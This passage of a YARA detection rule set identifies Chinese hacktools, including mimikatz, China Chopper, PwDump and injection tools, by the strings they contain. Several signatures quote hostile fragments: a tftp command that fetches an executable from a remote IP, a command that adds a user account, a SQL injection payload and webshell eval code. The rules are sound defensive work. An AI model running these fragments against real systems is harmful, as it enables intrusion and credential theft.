		description = "Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		super_rule = 1
		hash0 = "d1a5e3b646a16a7fcccf03759bd0f96480111c96"
		hash1 = "2cb4c3916271868c30c7b4598da697f59e9c7a12"
		hash2 = "fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372"
	strings:
		$s1 = "sfUserAppDataRoaming" fullword ascii
		$s2 = "$TRzFrameControllerPropertyConnection" fullword ascii
		$s3 = "delphi32.exe" fullword ascii
		$s4 = "hkeyCurrentUser" fullword ascii
		$s5 = "%s is not a valid IP address." fullword wide
		$s6 = "Citadel hooking error" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule _hscan_hscan_hscangui {
	meta:
		description = "Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		super_rule = 1
		hash0 = "17a743e40790985ececf5c66eaad2a1f8c4cffe8"
		hash1 = "568b06696ea0270ee1a744a5ac16418c8dacde1c"
		hash2 = "af8aced0a78e1181f4c307c78402481a589f8d07"
	strings:
		$s1 = ".\\log\\Hscan.log" fullword ascii
		$s2 = ".\\report\\%s-%s.html" fullword ascii
		$s3 = "[%s]: checking \"FTP account: ftp/ftp@ftp.net\" ..." fullword ascii
		$s4 = "[%s]: IPC NULL session connection success !!!" fullword ascii
		$s5 = "Scan %d targets,use %4.1f minutes" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 240KB and all of them
}

rule Kiwi_Tools_Mimikatz_1 {
	meta:
		description = "Chinese Hacktool Set - from mimikatz files"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		super_rule = 1
		hash0 = "e57e79f190f8a24ca911e6c7e008743480c08553"
		hash1 = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
		hash2 = "7ac7541e20af7755b7d8141c5c1b7432465cabd8"
		hash3 = "9fbfe3eb49d67347ab57ae743f7542864bc06de6"
		hash4 = "5c90d648c414bdafb549291f95fe6f27c0c9b5ec"
		hash5 = "7addce4434670927c4efaa560524680ba2871d17"
		hash6 = "28c5c0bdb7786dc2771672a2c275be7d9b742ec7"
		hash7 = "b5c93489a1b62181594d0fb08cc510d947353bc8"
		hash8 = "6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5"
		hash9 = "5d578df9a71670aa832d1cd63379e6162564fb6b"
		hash10 = "febadc01a64a071816eac61a85418711debaf233"
		hash11 = "569ca4ff1a5ea537aefac4a04a2c588c566c6d86"
		hash12 = "56a61c808b311e2225849d195bbeb69733efe49a"
		hash13 = "8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16"
		hash14 = "44825e848bc3abdb6f31d0a49725bb6f498e9ccc"
		hash15 = "f661d6516d081c37ab7da0f4ec21b2cc6a9257c6"
		hash16 = "20facf1fa2d87cccf177403ca1a7852128a9a0ab"
		hash17 = "6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5"
	strings:
		$s1 = "http://blog.gentilkiwi.com/mimikatz" ascii
		$s2 = "Benjamin Delpy" fullword ascii
		$s3 = "GlobalSign" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule Kiwi_Tools_Mimikatz_2 {
	meta:
		description = "Chinese Hacktool Set - from mimikatz files"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		super_rule = 1
		hash0 = "e57e79f190f8a24ca911e6c7e008743480c08553"
		hash1 = "55d5dabd96c44d16e41f70f0357cba1dda26c24f"
		hash2 = "7ac7541e20af7755b7d8141c5c1b7432465cabd8"
		hash3 = "9fbfe3eb49d67347ab57ae743f7542864bc06de6"
		hash4 = "5c90d648c414bdafb549291f95fe6f27c0c9b5ec"
		hash5 = "7addce4434670927c4efaa560524680ba2871d17"
		hash6 = "28c5c0bdb7786dc2771672a2c275be7d9b742ec7"
		hash7 = "6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5"
		hash8 = "5d578df9a71670aa832d1cd63379e6162564fb6b"
		hash9 = "febadc01a64a071816eac61a85418711debaf233"
		hash10 = "569ca4ff1a5ea537aefac4a04a2c588c566c6d86"
		hash11 = "56a61c808b311e2225849d195bbeb69733efe49a"
		hash12 = "8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16"
		hash13 = "44825e848bc3abdb6f31d0a49725bb6f498e9ccc"
		hash14 = "f661d6516d081c37ab7da0f4ec21b2cc6a9257c6"
		hash15 = "6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5"
	strings:
		$s1 = "mimikatz" fullword wide
		$s2 = "Copyright (C) 2012 Gentil Kiwi" fullword wide
		$s3 = "Gentil Kiwi" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-06-23
	Identifier: CN-PentestSet
*/

/* Rule Set ----------------------------------------------------------------- */

rule CN_Honker_MAC_IPMAC {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file IPMAC.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "24d55b6bec5c9fff4cd6f345bacac7abadce1611"
	strings:
		$s1 = "Http://Www.YrYz.Net" fullword wide
		$s2 = "IpMac.txt" fullword ascii
		$s3 = "192.168.0.1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 267KB and all of them
}

rule CN_Honker_GetSyskey {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file GetSyskey.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "17cec5e75cda434d0a1bc8cdd5aa268b42633fe9"
	strings:
		$s2 = "GetSyskey <SYSTEM registry file> [Output system key file]" fullword ascii
		$s4 = "The system key file \"%s\" is created." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 40KB and all of them
}

rule CN_Honker_Churrasco {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Churrasco.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "5a3c935d82a5ff0546eff51bb2ef21c88198f5b8"
	strings:
		$s0 = "HEAD9 /" ascii
		$s1 = "logic_er" fullword ascii
		$s6 = "proggam" fullword ascii
		$s16 = "DtcGetTransactionManagerExA" fullword ascii  /* Goodware String - occured 12 times */
		$s17 = "GetUserNameA" fullword ascii  /* Goodware String - occured 305 times */
		$s18 = "OLEAUT" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1276KB and all of them
}

rule CN_Honker_mysql_injectV1_1_Creak {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file mysql_injectV1.1_Creak.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "a1f066789f48a76023598c5777752c15f91b76b0"
	strings:
		$s0 = "1http://192.169.200.200:2217/mysql_inject.php?id=1" fullword ascii
		$s12 = "OnGetPassword" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 5890KB and all of them
}

rule CN_Honker_ASP_wshell {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file wshell.txt"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "3ae33c835e7ea6d9df74fe99fcf1e2fb9490c978"
	strings:
		$s0 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
		$s1 = "UserPass="
		$s2 = "VerName="
		$s3 = "StateName="
	condition:
		uint16(0) == 0x253c and filesize < 200KB and all of them
}

rule CN_Honker_exp_iis7 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file iis7.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "0a173c5ece2fd4ac8ecf9510e48e95f43ab68978"
	strings:
		$s0 = "\\\\localhost" fullword ascii
		$s1 = "iis.run" fullword ascii
		$s3 = ">Could not connecto %s" fullword ascii
		$s4 = "WinSta0\\Default" fullword ascii  /* Goodware String - occured 22 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 60KB and all of them
}

rule CN_Honker_SegmentWeapon {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file SegmentWeapon.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "494ef20067a7ce2cc95260e4abc16fcfa7177fdf"
	strings:
		$s0 = "C:\\WINDOWS\\system32\\msvbvm60.dll\\3" fullword ascii
		$s1 = "http://www.nforange.com/inc/1.asp?" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule CN_Honker_Alien_iispwd {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file iispwd.vbs"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "5d157a1b9644adbe0b28c37d4022d88a9f58cedb"
	strings:
		$s0 = "set IIs=objservice.GetObject(\"IIsWebServer\",childObjectName)" fullword ascii
		$s1 = "wscript.echo \"from : http://www.xxx.com/\" &vbTab&vbCrLf" fullword ascii
	condition:
		filesize < 3KB and all of them
}

rule CN_Honker_Md5CrackTools {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Md5CrackTools.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "9dfd9c9923ae6f6fe4cbfa9eb69688269285939c"
	strings:
		$s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* PEStudio Blacklist: agent */
		$s2 = ",<a href='index.php?c=1&type=md5&hash=" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 4580KB and all of them
}

rule CN_Honker_CoolScan_scan {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file scan.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "e1c5fb6b9f4e92c4264c7bea7f5fba9a5335c328"
	strings:
		$s0 = "User-agent:\\s{0,32}(huasai|huasai/1.0|\\*)" fullword ascii
		$s1 = "scan web.exe" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 3680KB and all of them
}

rule CN_Honker_mempodipper2_6 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file mempodipper2.6.39"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "ba2c79911fe48660898039591e1742b3f1a9e923"
	strings:
		$s0 = "objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed" ascii
	condition:
		filesize < 30KB and all of them
}

rule CN_Honker_COOKIE_CooKie {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file CooKie.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f7727160257e0e716e9f0cf9cdf9a87caa986cde"
	strings:
		$s4 = "-1 union select 1,username,password,4,5,6,7,8,9,10 from admin" fullword ascii
		$s5 = "CooKie.exe" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 360KB and all of them
}

rule CN_Honker_wwwscan_1_wwwscan {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file wwwscan.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "6bed45629c5e54986f2d27cbfc53464108911026"
	strings:
		$s0 = "%s www.target.com -p 8080 -m 10 -t 16" fullword ascii
		$s3 = "GET /nothisexistpage.html HTTP/1.1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 180KB and all of them
}

rule CN_Honker_D_injection_V2_32 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file D_injection_V2.32.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "3a000b976c79585f62f40f7999ef9bdd326a9513"
	strings:
		$s0 = "Missing %s property(CommandText does not return a result set{Error creating obje" wide
		$s1 = "/tftp -i 219.134.46.245 get 9493.exe c:\\9394.exe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and all of them
}

rule CN_Honker_net_priv_esc2 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file net-priv-esc2.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "4851e0088ad38ac5b3b1c75302a73698437f7f17"
	strings:
		$s1 = "Usage:%s username password" fullword ascii
		$s2 = "<www.darkst.com>" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 17KB and all of them
}

rule CN_Honker_Oracle_v1_0_Oracle {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Oracle.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "0264f4efdba09eaf1e681220ba96de8498ab3580"
	strings:
		$s1 = "!http://localhost/index.asp?id=zhr" fullword ascii
		$s2 = "OnGetPassword" fullword ascii
		$s3 = "Mozilla/3.0 (compatible; Indy Library)" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3455KB and all of them
}

rule CN_Honker_Interception {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Interception.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "ea813aed322e210ea6ae42b73b1250408bf40e7a"
	strings:
		$s2 = ".\\dat\\Hookmsgina.dll" fullword ascii
		$s5 = "WinlogonHackEx " fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 160KB and all of them
}

rule CN_Honker_sig_3389_DUBrute_v3_0_RC3_3_0 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file 3.0.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "49b311add0940cf183e3c7f3a41ea6e516bf8992"
	strings:
		$s0 = "explorer.exe http://bbs.yesmybi.net" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s9 = "CryptGenRandom" fullword ascii  /* Goodware String - occured 581 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 395KB and all of them
}

rule CN_Honker_windows_exp {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file exp.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "04334c396b165db6e18e9b76094991d681e6c993"
	strings:
		$s0 = "c:\\windows\\system32\\command.com /c " fullword ascii
		$s8 = "OH,Sry.Too long command." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 220KB and all of them
}

rule CN_Honker_safe3wvs_cgiscan {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file cgiscan.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f94bbf2034ad9afa43cca3e3a20f142e0bb54d75"
	strings:
		$s2 = "httpclient.exe" fullword wide
		$s3 = "www.safe3.com.cn" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 357KB and all of them
}

rule CN_Honker_pr_debug {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file debug.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "d11e6c6f675b3be86e37e50184dadf0081506a89"
	strings:
		$s1 = "-->Got WMI process Pid: %d " ascii
		$s2 = "This exploit will execute \"net user temp 123456 /add & net localg" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 820KB and all of them
}

rule CN_Honker_T00ls_Lpk_Sethc_v4_0 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v4.0.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "98f21f72c761e504814f0a7db835a24a2413a6c2"
	strings:
		$s0 = "LOADER ERROR" fullword ascii
		$s15 = "2011-2012 T00LS&RICES" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 2077KB and all of them
}

rule CN_Honker_MatriXay1073 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file MatriXay1073.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "fef951e47524f827c7698f4508ba9551359578a5"
	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1" ascii
		$s1 = "Policy\\Scan\\GetUserLen.ini" fullword ascii
		$s2 = "!YEL!Using http://127.0.0.1:%d/ to visiter https://%s:%d/" fullword ascii
		$s3 = "getalluserpasswordhash" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 9100KB and all of them
}

rule CN_Honker_Sword1_5 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Sword1.5.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "96ee5c98e982aa8ed92cb4cedb85c7fda873740f"
	strings:
		$s1 = "http://www.md5.com.cn" fullword wide
		$s2 = "ListBox_Command" fullword wide
		$s3 = "\\Set.ini" fullword wide
		$s4 = "OpenFileDialog1" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 740KB and all of them
}

rule CN_Honker_Havij_Havij {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Havij.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "0d8b275bd1856bc6563dd731956f3b312e1533cd"
	strings:
		$s1 = "User-Agent: %Inject_Here%" fullword wide
		$s2 = "BACKUP database master to disk='d:\\Inetpub\\wwwroot\\1.zip'" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule CN_Honker_exp_ms11011 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ms11011.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "5ad7a4962acbb6b0e3b73d77385eb91feb88b386"
	strings:
		$s0 = "\\i386\\Hello.pdb" ascii
		$s1 = "OS not supported." fullword ascii
		$s2 = ".Rich5" fullword ascii
		$s3 = "Not supported." fullword wide  /* Goodware String - occured 3 times */
		$s5 = "cmd.exe" fullword ascii  /* Goodware String - occured 120 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule CN_Honker_DLL_passive_privilege_escalation_ws2help {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ws2help.dll"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "e539b799c18d519efae6343cff362dcfd8f57f69"
	strings:
		$s0 = "PassMinDll.dll" fullword ascii
		$s1 = "\\ws2help.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 30KB and all of them
}

rule CN_Honker_Webshell {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Webshell.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "c85bd09d241c2a75b4e4301091aa11ddd5ad6d59"
	strings:
		$s1 = "Windows NT users: Please note that having the WinIce/SoftIce" fullword ascii
		$s2 = "Do you want to cancel the file download?" fullword ascii
		$s3 = "Downloading: %s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 381KB and all of them
}

rule CN_Honker_AspxClient {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file AspxClient.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "67569a89128f503a459eab3daa2032261507f2d2"
	strings:
		$s1 = "\\tools\\hashq\\hashq.exe" fullword wide
		$s2 = "\\Release\\CnCerT.CCdoor.Client.pdb" fullword ascii
		$s3 = "\\myshell.mdb" fullword wide
		$s4 = "injectfile" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 3 of them
}

rule CN_Honker_Fckeditor {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Fckeditor.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "4b16ae12c204f64265acef872526b27111b68820"
	strings:
		$s0 = "explorer.exe http://user.qzone.qq.com/568148075" fullword wide
		$s7 = "Fckeditor.exe" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1340KB and all of them
}

rule CN_Honker_Codeeer_Explorer {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Codeeer Explorer.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f32e05f3fefbaa2791dd750e4a3812581ce0f205"
	strings:
		$s2 = "Codeeer Explorer.exe" fullword wide
		$s12 = "webBrowser1_ProgressChanged" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 470KB and all of them
}

rule CN_Honker_SwordHonkerEdition {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file SwordHonkerEdition.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "3f9479151c2cada04febea45c2edcf5cece1df6c"
	strings:
		$s0 = "\\bin\\systemini\\MyPort.ini" fullword wide
		$s1 = "PortThread=200 //" fullword wide
		$s2 = " Port Open -> " fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 375KB and all of them
}

rule CN_Honker_HASH_PwDump7 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file PwDump7.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "93a2d7c3a9b83371d96a575c15fe6fce6f9d50d3"
	strings:
		$s1 = "%s\\SYSTEM32\\CONFIG\\SAM" fullword ascii
		$s2 = "No Users key!" fullword ascii
		$s3 = "NO PASSWORD*********************:" fullword ascii
		$s4 = "Unable to dump file %S" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 380KB and all of them
}

rule CN_Honker_ChinaChopper {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ChinaChopper.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "fa347fdb23ab0b8d0560a0d20c434549d78e99b5"
	strings:
		$s1 = "$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$u" wide
		$s3 = "SETP c:\\windows\\system32\\cmd.exe " fullword wide
		$s4 = "Ev al (\"Exe cute(\"\"On+Error+Resume+Next:%s:Response.Write(\"\"\"\"->|\"\"\"\"" wide
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them
}

rule CN_Honker_dedecms5_7 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file dedecms5.7.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f9cbb25883828ca266e32ff4faf62f5a9f92c5fb"
	strings:
		$s1 = "/data/admin/ver.txt" fullword ascii
		$s2 = "SkinH_EL.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 830KB and all of them
}

rule CN_Honker_Alien_ee {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ee.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "15a7211154ee7aca29529bd5c2500e0d33d7f0b3"
	strings:
		$s1 = "GetIIS UserName and PassWord." fullword wide
		$s2 = "Read IIS ID For FreeHost." fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 50KB and all of them
}

rule CN_Honker_smsniff_smsniff {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file smsniff.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "8667a785a8ced76d0284d225be230b5f1546f140"
	strings:
		$s1 = "smsniff.exe" fullword wide
		$s5 = "SmartSniff" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 267KB and all of them
}

rule CN_Honker_Happy_Happy {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Happy.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "92067d8dad33177b5d6c853d4d0e897f2ee846b0"
	strings:
		$s1 = "<form.*?method=\"post\"[\\s\\S]*?</form>" fullword wide
		$s2 = "domainscan.exe" fullword wide
		$s3 = "http://www.happysec.com/" fullword wide
		$s4 = "cmdshell" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 655KB and 2 of them
}

rule CN_Honker_T00ls_Lpk_Sethc_v3_0 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v3.0.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "fa47c4affbac01ba5606c4862fdb77233c1ef656"
	strings:
		$s1 = "http://127.0.0.1/1.exe" fullword wide
		$s2 = ":Rices  Forum:T00Ls.Net  [4 Fucker Te@m]" fullword wide
		$s3 = "SkinH_EL.dll" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them
}

rule CN_Honker_NetFuke_NetFuke {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file NetFuke.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f89e223fd4f6f5a3c2a2ea225660ef0957fc07ba"
	strings:
		$s1 = "Mac Flood: Flooding %dT %d p/s " fullword ascii
		$s2 = "netfuke_%s.txt" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1840KB and all of them
}

rule CN_Honker_ManualInjection {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ManualInjection.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "e83d427f44783088a84e9c231c6816c214434526"
	strings:
		$s0 = "http://127.0.0.1/cookie.asp?fuck=" fullword ascii
		$s16 = "http://Www.cnhuker.com | http://www.0855.tv" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule CN_Honker_CnCerT_CCdoor_CMD {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "1c6ed7d817fa8e6534a5fd36a94f4fc2f066c9cd"
	strings:
		$s2 = "CnCerT.CCdoor.CMD.dll" fullword wide
		$s3 = "cmdpath" fullword ascii
		$s4 = "Get4Bytes" fullword ascii
		$s5 = "ExcuteCmd" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 22KB and all of them
}

rule CN_Honker_termsrvhack {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file termsrvhack.dll"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "1c456520a7b7faf71900c71167038185f5a7d312"
	strings:
		$s1 = "The terminal server cannot issue a client license.  It was unable to issue the" wide
		$s6 = "%s\\%s\\%d\\%d" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1052KB and all of them
}

rule CN_Honker_IIS6_iis6 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file iis6.com"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f0c9106d6d2eea686fd96622986b641968d0b864"
	strings:
		$s0 = "GetMod;ul" fullword ascii
		$s1 = "excjpb" fullword ascii
		$s2 = "LEAUT1" fullword ascii
		$s3 = "EnumProcessModules" fullword ascii  /* Goodware String - occured 410 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 50KB and all of them
}

rule CN_Honker_struts2_catbox {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file catbox.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "ee8fbd91477e056aef34fce3ade474cafa1a4304"
	strings:
		$s6 = "'Toolmao box by gainover www.toolmao.com" fullword ascii
		$s20 = "{external.exeScript(_toolmao_bgscript[i],'javascript',false);}}" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 8160KB and all of them
}

rule CN_Honker_getlsasrvaddr {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file getlsasrvaddr.exe - WCE Amplia Security"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "a897d5da98dae8d80f3c0a0ef6a07c4b42fb89ce"
	strings:
		$s8 = "pingme.txt" fullword ascii
		$s16 = ".\\lsasrv.pdb" fullword ascii
		$s20 = "Addresses Found: " fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
